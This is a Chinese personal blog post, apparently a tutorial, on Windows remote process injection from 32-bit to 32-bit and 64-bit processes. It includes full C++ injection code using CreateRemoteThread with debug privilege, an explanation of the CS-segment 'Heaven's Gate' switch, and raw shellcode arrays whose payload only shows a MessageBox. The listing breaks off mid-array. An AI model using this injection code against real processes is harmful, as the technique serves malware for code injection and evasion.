@@ -1,0 +1,1438 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/cray/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/cray/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="description" content="个人学习生活博客,寻志同道合朋友相互学习,共同进步.">
+  <meta name="author" content="Cray">
+  <meta name="keywords" content>
+  <title>32-&gt;64注入shellcode ~ CrayBlog</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/cray/lib/prettify/tomorrow.min.css">
+
+<link rel="stylesheet" href="/cray/css/main.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/cray/">&nbsp;<strong>CrayBlog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/cray/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/cray/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/cray/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/cray/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" false
+         style="background: url('https://gitee.com//L0yy/BlogImg/raw/master/typora/timg.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <br>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    7.7k 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      46 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <h2 id="远进程注入"><a href="#远进程注入" class="headerlink" title="远进程注入"></a>远进程注入</h2><p><a href="https://www.cnblogs.com/uAreKongqi/p/6012353.html" target="_blank" rel="noopener">注入参考——必看</a></p>
+<h3 id="32位-gt-32位"><a href="#32位-gt-32位" class="headerlink" title="32位-&gt;32位"></a>32位-&gt;32位</h3><p>核心思路如下</p>
+<ul>
+<li>根据进程ID打开进程，获得进程句柄</li>
+<li>申请内存空间</li>
+<li>写入数据</li>
+<li>将内存改为可读可执行(可选)</li>
+<li>创建线程</li>
+<li>等待线程退出(可选)</li>
+</ul>
+<p><strong>使用到的API</strong></p>
+<ul>
+<li>OpenProcess</li>
+<li>VirtualAllocEx</li>
+<li>WriteProcessMemory</li>
+<li>VirtualProtectEx</li>
+<li>CreateRemoteThread</li>
+<li>WaitForSingleObject</li>
+</ul>
+<p>注入模板网上都有。这里贴一下注入函数且带有参数的写法</p>
+<pre><code class="c++">#pragma once  
+#include &lt;windows.h&gt;  
+#include &lt;TlHelp32.h&gt;  
+#include &quot;stdio.h&quot;
+
+typedef struct _RemoteParam {
+    char szMsg[12];    //MessageBox函数中显示的字符提示  
+    DWORD dwMessageBox;//MessageBox函数的入口地址  
+} RemoteParam, * PRemoteParam;
+
+//定义MessageBox类型的函数指针  
+typedef int(__stdcall* PFN_MESSAGEBOX)(HWND, LPCSTR, LPCSTR, DWORD);
+
+DWORD __stdcall threadProc(LPVOID lParam)
+{
+    RemoteParam* pRP = (RemoteParam*)lParam;
+    PFN_MESSAGEBOX pfnMessageBox;
+    pfnMessageBox = (PFN_MESSAGEBOX)pRP-&gt;dwMessageBox;
+    pfnMessageBox(NULL, pRP-&gt;szMsg, pRP-&gt;szMsg, 0);
+    return 0;
+}
+
+bool enableDebugPriv()
+{
+    HANDLE hToken;
+    LUID sedebugnameValue;
+    TOKEN_PRIVILEGES tkp;
+    if (!OpenProcessToken(GetCurrentProcess(),
+        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) {
+        return false;
+    }
+    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;sedebugnameValue)) {
+        CloseHandle(hToken);
+        return false;
+    }
+    tkp.PrivilegeCount = 1;
+    tkp.Privileges[0].Luid = sedebugnameValue;
+    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) {
+        CloseHandle(hToken);
+        return false;
+    }
+    return true;
+}
+
+HANDLE GetProcessHandleByName(LPCWSTR lpszProcessName)
+{
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(PROCESSENTRY32);
+    if (!Process32First(hSnapshot, &amp;pe)) {
+        MessageBoxA(NULL,
+            &quot;The frist entry of the process list has not been copyied to the buffer&quot;,
+            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);
+        return 0;
+    }
+    while (Process32Next(hSnapshot, &amp;pe)) {
+        if (!lstrcmpW(lpszProcessName, pe.szExeFile)) {
+            return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
+        }
+    }
+    return 0;
+}
+
+int _main()
+{
+    const DWORD dwThreadSize = 4096;
+    DWORD dwWriteBytes = 0;
+    enableDebugPriv();
+    HANDLE TargetProc = GetProcessHandleByName(L&quot;CheckVm.exe&quot;);
+    if (!TargetProc)
+    {
+        MessageBoxA(NULL,
+            &quot;Open target process failed !&quot;,
+            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);
+        return 0;
+    }
+
+    //在宿主进程中为线程体开辟一块存储区域  
+    //在这里需要注意MEM_COMMIT | MEM_RESERVE内存非配类型以及PAGE_EXECUTE_READWRITE内存保护类型  
+    //其具体含义请参考MSDN中关于VirtualAllocEx函数的说明。  
+    void* pRemoteThread = VirtualAllocEx(TargetProc, 0,
+        dwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!pRemoteThread) {
+        MessageBoxA(NULL, &quot;Alloc memory in target process failed !&quot;,
+            &quot;notice&quot;, MB_ICONINFORMATION | MB_OK);
+        return 0;
+    }
+
+    //将线程体拷贝到宿主进程中  
+    if (!WriteProcessMemory(TargetProc,
+        pRemoteThread, &amp;threadProc, dwThreadSize, 0)) {
+        MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,
+            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);
+        return 0;
+    }
+    //定义线程参数结构体变量  
+    RemoteParam remoteData;
+    ZeroMemory(&amp;remoteData, sizeof(RemoteParam));
+
+    //填充结构体变量中的成员  
+    HINSTANCE hUser32 = LoadLibrary(L&quot;User32.dll&quot;);
+    remoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, &quot;MessageBoxA&quot;);
+    strcat_s(remoteData.szMsg, &quot;Hello＼0&quot;);
+
+    //为线程参数在宿主进程中开辟存储区域  
+    RemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx(
+        TargetProc, 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE);
+
+    if (!pRemoteParam) {
+        MessageBoxA(NULL, &quot;Alloc memory failed !&quot;,
+            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);
+        return 0;
+    }
+    //将线程参数拷贝到宿主进程地址空间中  
+    if (!WriteProcessMemory(TargetProc,
+        pRemoteParam, &amp;remoteData, sizeof(remoteData), 0)) {
+        MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,
+            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);
+        return 0;
+    }
+
+    //在宿主进程中创建线程  
+    HANDLE hRemoteThread = CreateRemoteThread(
+        TargetProc, NULL, 0, (DWORD(__stdcall*)(void*))pRemoteThread,
+        pRemoteParam, 0, &amp;dwWriteBytes);
+    if (!hRemoteThread) {
+        MessageBoxA(NULL, &quot;Create remote thread failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);
+        return 0;
+    }
+    CloseHandle(hRemoteThread);
+    FreeLibrary(hUser32);
+    return 0;
+}</code></pre>
+<h3 id="32位-gt-64位"><a href="#32位-gt-64位" class="headerlink" title="32位-&gt;64位"></a>32位-&gt;64位</h3><p>核心思路如下</p>
+<ul>
+<li>根据进程ID打开进程，获得进程句柄</li>
+<li>申请内存空间</li>
+<li>写入数据</li>
+<li>将内存改为可读可执行(可选)</li>
+<li>创建线程</li>
+<li>等待线程退出(可选)</li>
+</ul>
+<p><strong>使用到的API</strong></p>
+<ul>
+<li>OpenProcess</li>
+<li>VirtualAllocEx</li>
+<li>WriteProcessMemory</li>
+<li>VirtualProtectEx</li>
+<li><strong>CreateRemoteThread64</strong></li>
+<li>WaitForSingleObject</li>
+</ul>
+<p>32位去注入64位进程时<code>CreateRemoteThread</code>会调用失败，需要使用64位的接口</p>
+<p>先提升到64位汇编，在遍历ntdll.dll中的导出函数 <code>CreateRemoteThread</code></p>
+<h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><p><a href="https://www.cnblogs.com/HsinTsao/p/7270732.html" target="_blank" rel="noopener">32位注入64位参考</a></p>
+<p>3g大佬代码代码有点问题，有点误导</p>
+<p>获取64位代码是32位的汇编，他写的64位的结果，实则是通过遍历ntdll64里面的64位API 实现的</p>
+<blockquote>
+<p> 在x64系统下的进程是有32位和64位两种工作模式，这两种工作模式的区别在于CS寄存器。32位模式时，<strong>CS = 0x23</strong>；64位模式时，<strong>CS = 0x33</strong>。</p>
+<p>这两种工作模式是可以进行切换的，一般会通过retf指令，一条retf指令等效于以下2条汇编指令</p>
+<p><code>pop ip</code></p>
+<p><code>pop cs</code></p>
+</blockquote>
+<p>代码中<code>CREATETHREADPIC</code>shellcode是用来得到64位的<code>CreateRemoteThread</code></p>
+<p><code>EXECPIC</code>是我通过vs生成的谈拆管理shellcode，可疑调整为任意代码</p>
+<pre><code class="c++">#pragma once  
+#include &lt;windows.h&gt;  
+#include &lt;TlHelp32.h&gt;  
+#include &lt;iostream&gt;
+using namespace std;
+
+#define CREATETHREADPIC_SIZE 271
+char CREATETHREADPIC[] = {
+    /* 0000 */ &quot;\x53&quot;                             /* push ebx                    */
+    /* 0001 */ &quot;\x56&quot;                             /* push esi                    */
+    /* 0002 */ &quot;\x57&quot;                             /* push edi                    */
+    /* 0003 */ &quot;\x55&quot;                             /* push ebp                    */
+    /* 0004 */ &quot;\xe8\x6c\x00\x00\x00&quot;             /* call 0x75                   */
+    /* 0009 */ &quot;\x85\xc0&quot;                         /* test eax, eax               */
+    /* 000B */ &quot;\x74\x5d&quot;                         /* jz 0x6a                     */
+    /* 000D */ &quot;\x48\x89\xe6&quot;                     /* mov rsi, rsp                */
+    /* 0010 */ &quot;\x48\x83\xe4\xf0&quot;                 /* and rsp, 0xfffffffffffffff0 */
+    /* 0014 */ &quot;\x48\x83\xec\x68&quot;                 /* sub rsp, 0x68               */
+    /* 0018 */ &quot;\xb8\xfa\x80\x39\x5e&quot;             /* mov eax, 0x5e3980fa         */
+    /* 001D */ &quot;\xe8\x78\x00\x00\x00&quot;             /* call 0x9a                   */
+    /* 0022 */ &quot;\x48\x89\xc3&quot;                     /* mov rbx, rax                */
+    /* 0025 */ &quot;\x4d\x31\xc0&quot;                     /* xor r8, r8                  */
+    /* 0028 */ &quot;\x48\x31\xc0&quot;                     /* xor rax, rax                */
+    /* 002B */ &quot;\x48\x89\x44\x24\x50&quot;             /* mov [rsp+0x50], rax         */
+    /* 0030 */ &quot;\x48\x89\x44\x24\x48&quot;             /* mov [rsp+0x48], rax         */
+    /* 0035 */ &quot;\x48\x89\x44\x24\x40&quot;             /* mov [rsp+0x40], rax         */
+    /* 003A */ &quot;\x48\x89\x44\x24\x38&quot;             /* mov [rsp+0x38], rax         */
+    /* 003F */ &quot;\x48\x89\x44\x24\x30&quot;             /* mov [rsp+0x30], rax         */
+    /* 0044 */ &quot;\x8b\x46\x24&quot;                     /* mov eax, [rsi+0x24]         */
+    /* 0047 */ &quot;\x48\x89\x44\x24\x28&quot;             /* mov [rsp+0x28], rax         */
+    /* 004C */ &quot;\x8b\x46\x20&quot;                     /* mov eax, [rsi+0x20]         */
+    /* 004F */ &quot;\x48\x89\x44\x24\x20&quot;             /* mov [rsp+0x20], rax         */
+    /* 0054 */ &quot;\x44\x8b\x4e\x14&quot;                 /* mov r9d, [rsi+0x14]         */
+    /* 0058 */ &quot;\xba\x00\x00\x00\x10&quot;             /* mov edx, 0x10000000         */
+    /* 005D */ &quot;\x8b\x4e\x30&quot;                     /* mov ecx, [rsi+0x30]         */
+    /* 0060 */ &quot;\xff\xd3&quot;                         /* call rbx                    */
+    /* 0062 */ &quot;\x48\x89\xf4&quot;                     /* mov rsp, rsi                */
+    /* 0065 */ &quot;\xe8\x18\x00\x00\x00&quot;             /* call 0x82                   */
+    /* 006A */ &quot;\x5d&quot;                             /* pop rbp                     */
+    /* 006B */ &quot;\x5f&quot;                             /* pop rdi                     */
+    /* 006C */ &quot;\x5e&quot;                             /* pop rsi                     */
+    /* 006D */ &quot;\x5b&quot;                             /* pop rbx                     */
+    /* 006E */ &quot;\xc3&quot;                             /* ret                         */
+    /* 006F */ &quot;\x31\xc0&quot;                         /* xor eax, eax                */
+    /* 0071 */ &quot;\x48\xf7\xd8&quot;                     /* neg eax                     */
+    /* 0074 */ &quot;\xc3&quot;                             /* ret                         */
+    /* 0075 */ &quot;\xe8\xf5\xff\xff\xff&quot;             /* call 0x6f                   */
+    /* 007A */ &quot;\x74\x05&quot;                         /* jz 0x81                     */
+    /* 007C */ &quot;\x58&quot;                             /* pop eax                     */
+    /* 007D */ &quot;\x6a\x33&quot;                         /* push 0x33                   */ //将cs修改为0x33
+    /* 007F */ &quot;\x50&quot;                             /* push eax                    */ //也就能执行64位汇编了
+    /* 0080 */ &quot;\xcb&quot;                             /* retf                        */
+    /* 0081 */ &quot;\xc3&quot;                             /* ret                         */
+    /* 0082 */ &quot;\xe8\xe8\xff\xff\xff&quot;             /* call 0x6f                   */
+    /* 0087 */ &quot;\x75\x10&quot;                         /* jnz 0x99                    */
+    /* 0089 */ &quot;\x58&quot;                             /* pop rax                     */
+    /* 008A */ &quot;\x83\xec\x08&quot;                     /* sub esp, 0x8                */
+    /* 008D */ &quot;\x89\x04\x24&quot;                     /* mov [rsp], eax              */
+    /* 0090 */ &quot;\xc7\x44\x24\x04\x23\x00\x00\x00&quot; /* mov dword [rsp+0x4], 0x23   */
+    /* 0098 */ &quot;\xcb&quot;                             /* retf                        */
+    /* 0099 */ &quot;\xc3&quot;                             /* ret                         */
+    /* 009A */ &quot;\x56&quot;                             /* push rsi                    */
+    /* 009B */ &quot;\x57&quot;                             /* push rdi                    */
+    /* 009C */ &quot;\x53&quot;                             /* push rbx                    */
+    /* 009D */ &quot;\x51&quot;                             /* push rcx                    */
+    /* 009E */ &quot;\x49\x89\xc0&quot;                     /* mov r8, rax                 */
+    /* 00A1 */ &quot;\x6a\x60&quot;                         /* push 0x60                   */
+    /* 00A3 */ &quot;\x5e&quot;                             /* pop rsi                     */
+    /* 00A4 */ &quot;\x65\x48\x8b\x06&quot;                 /* mov rax, [gs:rsi]           */
+    /* 00A8 */ &quot;\x48\x8b\x40\x18&quot;                 /* mov rax, [rax+0x18]         */
+    /* 00AC */ &quot;\x4c\x8b\x50\x30&quot;                 /* mov r10, [rax+0x30]         */
+    /* 00B0 */ &quot;\x49\x8b\x6a\x10&quot;                 /* mov rbp, [r10+0x10]         */
+    /* 00B4 */ &quot;\x48\x85\xed&quot;                     /* test rbp, rbp               */
+    /* 00B7 */ &quot;\x89\xe8&quot;                         /* mov eax, ebp                */
+    /* 00B9 */ &quot;\x74\x4f&quot;                         /* jz 0x10a                    */
+    /* 00BB */ &quot;\x4d\x8b\x12&quot;                     /* mov r10, [r10]              */
+    /* 00BE */ &quot;\x8b\x45\x3c&quot;                     /* mov eax, [rbp+0x3c]         */
+    /* 00C1 */ &quot;\x83\xc0\x10&quot;                     /* add eax, 0x10               */
+    /* 00C4 */ &quot;\x8b\x44\x05\x78&quot;                 /* mov eax, [rbp+rax+0x78]     */
+    /* 00C8 */ &quot;\x48\x8d\x74\x05\x18&quot;             /* lea rsi, [rbp+rax+0x18]     */
+    /* 00CD */ &quot;\xad&quot;                             /* lodsd                       */
+    /* 00CE */ &quot;\x91&quot;                             /* xchg ecx, eax               */
+    /* 00CF */ &quot;\x67\xe3\xde&quot;                     /* jecxz 0xb0                  */
+    /* 00D2 */ &quot;\xad&quot;                             /* lodsd                       */
+    /* 00D3 */ &quot;\x4c\x8d\x5c\x05\x00&quot;             /* lea r11, [rbp+rax]          */
+    /* 00D8 */ &quot;\xad&quot;                             /* lodsd                       */
+    /* 00D9 */ &quot;\x48\x8d\x7c\x05\x00&quot;             /* lea rdi, [rbp+rax]          */
+    /* 00DE */ &quot;\xad&quot;                             /* lodsd                       */
+    /* 00DF */ &quot;\x48\x8d\x5c\x05\x00&quot;             /* lea rbx, [rbp+rax]          */
+    /* 00E4 */ &quot;\x8b\x74\x8f\xfc&quot;                 /* mov esi, [rdi+rcx*4-0x4]    */
+    /* 00E8 */ &quot;\x48\x01\xee&quot;                     /* add rsi, rbp                */
+    /* 00EB */ &quot;\x31\xc0&quot;                         /* xor eax, eax                */
+    /* 00ED */ &quot;\x99&quot;                             /* cdq                         */
+    /* 00EE */ &quot;\xac&quot;                             /* lodsb                       */
+    /* 00EF */ &quot;\x01\xc2&quot;                         /* add edx, eax                */
+    /* 00F1 */ &quot;\xc1\xc2\x05&quot;                     /* rol edx, 0x5                */
+    /* 00F4 */ &quot;\xff\xc8&quot;                         /* dec eax                     */
+    /* 00F6 */ &quot;\x79\xf6&quot;                         /* jns 0xee                    */
+    /* 00F8 */ &quot;\x44\x39\xc2&quot;                     /* cmp edx, r8d                */
+    /* 00FB */ &quot;\xe0\xe7&quot;                         /* loopne 0xe4                 */
+    /* 00FD */ &quot;\x75\xb1&quot;                         /* jnz 0xb0                    */
+    /* 00FF */ &quot;\x0f\xb7\x14\x4b&quot;                 /* movzx edx, word [rbx+rcx*2] */
+    /* 0103 */ &quot;\x41\x8b\x04\x93&quot;                 /* mov eax, [r11+rdx*4]        */
+    /* 0107 */ &quot;\x48\x01\xe8&quot;                     /* add rax, rbp                */
+    /* 010A */ &quot;\x59&quot;                             /* pop rcx                     */
+    /* 010B */ &quot;\x5b&quot;                             /* pop rbx                     */
+    /* 010C */ &quot;\x5f&quot;                             /* pop rdi                     */
+    /* 010D */ &quot;\x5e&quot;                             /* pop rsi                     */
+    /* 010E */ &quot;\xc3&quot;                             /* ret                         */
+};
+#define EXECPIC_SIZE 1984
+char EXECPIC[] = {
+    /* 0000 */ &quot;\x48\x81\xec\xd8\x00\x00\x00&quot;                     /* sub rsp, 0xd8                            */
+    /* 0007 */ &quot;\x48\xc7\x44\x24\x78\x00\x00\x00\x00&quot;             /* mov qword [rsp+0x78], 0x0                */
+    /* 0010 */ &quot;\x48\xc7\x84\x24\x80\x00\x00\x00\x00\x00\x00\x00&quot; /* mov qword [rsp+0x80], 0x0                */
+    /* 001C */ &quot;\x48\xc7\x84\x24\xa8\x00\x00\x00\x00\x00\x00\x00&quot; /* mov qword [rsp+0xa8], 0x0                */
+    /* 0028 */ &quot;\xb8\x75\x00\x00\x00&quot;                             /* mov eax, 0x75                            */
+    /* 002D */ &quot;\x66\x89\x44\x24\x58&quot;                             /* mov [rsp+0x58], ax                       */
+    /* 0032 */ &quot;\xb8\x73\x00\x00\x00&quot;                             /* mov eax, 0x73                            */
+    /* 0037 */ &quot;\x66\x89\x44\x24\x5a&quot;                             /* mov [rsp+0x5a], ax                       */
+    /* 003C */ &quot;\xb8\x65\x00\x00\x00&quot;                             /* mov eax, 0x65                            */
+    /* 0041 */ &quot;\x66\x89\x44\x24\x5c&quot;                             /* mov [rsp+0x5c], ax                       */
+    /* 0046 */ &quot;\xb8\x72\x00\x00\x00&quot;                             /* mov eax, 0x72                            */
+    /* 004B */ &quot;\x66\x89\x44\x24\x5e&quot;                             /* mov [rsp+0x5e], ax                       */
+    /* 0050 */ &quot;\xb8\x33\x00\x00\x00&quot;                             /* mov eax, 0x33                            */
+    /* 0055 */ &quot;\x66\x89\x44\x24\x60&quot;                             /* mov [rsp+0x60], ax                       */
+    /* 005A */ &quot;\xb8\x32\x00\x00\x00&quot;                             /* mov eax, 0x32                            */
+    /* 005F */ &quot;\x66\x89\x44\x24\x62&quot;                             /* mov [rsp+0x62], ax                       */
+    /* 0064 */ &quot;\xb8\x2e\x00\x00\x00&quot;                             /* mov eax, 0x2e                            */
+    /* 0069 */ &quot;\x66\x89\x44\x24\x64&quot;                             /* mov [rsp+0x64], ax                       */
+    /* 006E */ &quot;\xb8\x64\x00\x00\x00&quot;                             /* mov eax, 0x64                            */
+    /* 0073 */ &quot;\x66\x89\x44\x24\x66&quot;                             /* mov [rsp+0x66], ax                       */
+    /* 0078 */ &quot;\xb8\x6c\x00\x00\x00&quot;                             /* mov eax, 0x6c                            */
+    /* 007D */ &quot;\x66\x89\x44\x24\x68&quot;                             /* mov [rsp+0x68], ax                       */
+    /* 0082 */ &quot;\xb8\x6c\x00\x00\x00&quot;                             /* mov eax, 0x6c                            */
+    /* 0087 */ &quot;\x66\x89\x44\x24\x6a&quot;                             /* mov [rsp+0x6a], ax                       */
+    /* 008C */ &quot;\x33\xc0&quot;                                         /* xor eax, eax                             */
+    /* 008E */ &quot;\x66\x89\x44\x24\x6c&quot;                             /* mov [rsp+0x6c], ax                       */
+    /* 0093 */ &quot;\xc6\x44\x24\x30\x4d&quot;                             /* mov byte [rsp+0x30], 0x4d                */
+    /* 0098 */ &quot;\xc6\x44\x24\x31\x65&quot;                             /* mov byte [rsp+0x31], 0x65                */
+    /* 009D */ &quot;\xc6\x44\x24\x32\x73&quot;                             /* mov byte [rsp+0x32], 0x73                */
+    /* 00A2 */ &quot;\xc6\x44\x24\x33\x73&quot;                             /* mov byte [rsp+0x33], 0x73                */
+    /* 00A7 */ &quot;\xc6\x44\x24\x34\x61&quot;                             /* mov byte [rsp+0x34], 0x61                */
+    /* 00AC */ &quot;\xc6\x44\x24\x35\x67&quot;                             /* mov byte [rsp+0x35], 0x67                */
+    /* 00B1 */ &quot;\xc6\x44\x24\x36\x65&quot;                             /* mov byte [rsp+0x36], 0x65                */
+    /* 00B6 */ &quot;\xc6\x44\x24\x37\x42&quot;                             /* mov byte [rsp+0x37], 0x42                */
+    /* 00BB */ &quot;\xc6\x44\x24\x38\x6f&quot;                             /* mov byte [rsp+0x38], 0x6f                */
+    /* 00C0 */ &quot;\xc6\x44\x24\x39\x78&quot;                             /* mov byte [rsp+0x39], 0x78                */
+    /* 00C5 */ &quot;\xc6\x44\x24\x3a\x41&quot;                             /* mov byte [rsp+0x3a], 0x41                */
+    /* 00CA */ &quot;\xc6\x44\x24\x3b\x00&quot;                             /* mov byte [rsp+0x3b], 0x0                 */
+    /* 00CF */ &quot;\xc6\x44\x24\x40\x48&quot;                             /* mov byte [rsp+0x40], 0x48                */
+    /* 00D4 */ &quot;\xc6\x44\x24\x41\x65&quot;                             /* mov byte [rsp+0x41], 0x65                */
+    /* 00D9 */ &quot;\xc6\x44\x24\x42\x6c&quot;                             /* mov byte [rsp+0x42], 0x6c                */
+    /* 00DE */ &quot;\xc6\x44\x24\x43\x6c&quot;                             /* mov byte [rsp+0x43], 0x6c                */
+    /* 00E3 */ &quot;\xc6\x44\x24\x44\x6f&quot;                             /* mov byte [rsp+0x44], 0x6f                */
+    /* 00E8 */ &quot;\xc6\x44\x24\x45\x2e&quot;                             /* mov byte [rsp+0x45], 0x2e                */
+    /* 00ED */ &quot;\xc6\x44\x24\x46\x57&quot;                             /* mov byte [rsp+0x46], 0x57                */
+    /* 00F2 */ &quot;\xc6\x44\x24\x47\x6f&quot;                             /* mov byte [rsp+0x47], 0x6f                */
+    /* 00F7 */ &quot;\xc6\x44\x24\x48\x6c&quot;                             /* mov byte [rsp+0x48], 0x6c                */
+    /* 00FC */ &quot;\xc6\x44\x24\x49\x72&quot;                             /* mov byte [rsp+0x49], 0x72                */
+    /* 0101 */ &quot;\xc6\x44\x24\x4a\x64&quot;                             /* mov byte [rsp+0x4a], 0x64                */
+    /* 0106 */ &quot;\xc6\x44\x24\x4b\x21&quot;                             /* mov byte [rsp+0x4b], 0x21                */
+    /* 010B */ &quot;\xc6\x44\x24\x4c\x00&quot;                             /* mov byte [rsp+0x4c], 0x0                 */
+    /* 0110 */ &quot;\xe8\x3b\x05\x00\x00&quot;                             /* call 0x650                               */
+    /* 0115 */ &quot;\x48\x89\x84\x24\x88\x00\x00\x00&quot;                 /* mov [rsp+0x88], rax                      */
+    /* 011D */ &quot;\x48\x83\xbc\x24\x88\x00\x00\x00\xff&quot;             /* cmp qword [rsp+0x88], 0xffffffffffffffff */
+    /* 0126 */ &quot;\x75\x05&quot;                                         /* jnz 0x12d                                */
+    /* 0128 */ &quot;\xe9\xd9\x01\x00\x00&quot;                             /* jmp 0x306                                */
+    /* 012D */ &quot;\x48\x8b\x84\x24\x88\x00\x00\x00&quot;                 /* mov rax, [rsp+0x88]                      */
+    /* 0135 */ &quot;\x48\x89\x44\x24\x28&quot;                             /* mov [rsp+0x28], rax                      */
+    /* 013A */ &quot;\x48\x8b\x44\x24\x28&quot;                             /* mov rax, [rsp+0x28]                      */
+    /* 013F */ &quot;\x48\x89\x84\x24\xb0\x00\x00\x00&quot;                 /* mov [rsp+0xb0], rax                      */
+    /* 0147 */ &quot;\x48\x8b\x84\x24\xb0\x00\x00\x00&quot;                 /* mov rax, [rsp+0xb0]                      */
+    /* 014F */ &quot;\x48\x63\x40\x3c&quot;                                 /* movsxd rax, dword [rax+0x3c]             */
+    /* 0153 */ &quot;\x48\x8b\x4c\x24\x28&quot;                             /* mov rcx, [rsp+0x28]                      */
+    /* 0158 */ &quot;\x48\x03\xc8&quot;                                     /* add rcx, rax                             */
+    /* 015B */ &quot;\x48\x8b\xc1&quot;                                     /* mov rax, rcx                             */
+    /* 015E */ &quot;\x48\x89\x84\x24\xb8\x00\x00\x00&quot;                 /* mov [rsp+0xb8], rax                      */
+    /* 0166 */ &quot;\xb8\x08\x00\x00\x00&quot;                             /* mov eax, 0x8                             */
+    /* 016B */ &quot;\x48\x6b\xc0\x00&quot;                                 /* imul rax, rax, 0x0                       */
+    /* 016F */ &quot;\x48\x8b\x8c\x24\xb8\x00\x00\x00&quot;                 /* mov rcx, [rsp+0xb8]                      */
+    /* 0177 */ &quot;\x8b\x84\x01\x88\x00\x00\x00&quot;                     /* mov eax, [rcx+rax+0x88]                  */
+    /* 017E */ &quot;\x48\x8b\x4c\x24\x28&quot;                             /* mov rcx, [rsp+0x28]                      */
+    /* 0183 */ &quot;\x48\x03\xc8&quot;                                     /* add rcx, rax                             */
+    /* 0186 */ &quot;\x48\x8b\xc1&quot;                                     /* mov rax, rcx                             */
+    /* 0189 */ &quot;\x48\x89\x44\x24\x50&quot;                             /* mov [rsp+0x50], rax                      */
+    /* 018E */ &quot;\x48\x8b\x44\x24\x50&quot;                             /* mov rax, [rsp+0x50]                      */
+    /* 0193 */ &quot;\x8b\x40\x20&quot;                                     /* mov eax, [rax+0x20]                      */
+    /* 0196 */ &quot;\x48\x8b\x4c\x24\x28&quot;                             /* mov rcx, [rsp+0x28]                      */
+    /* 019B */ &quot;\x48\x03\xc8&quot;                                     /* add rcx, rax                             */
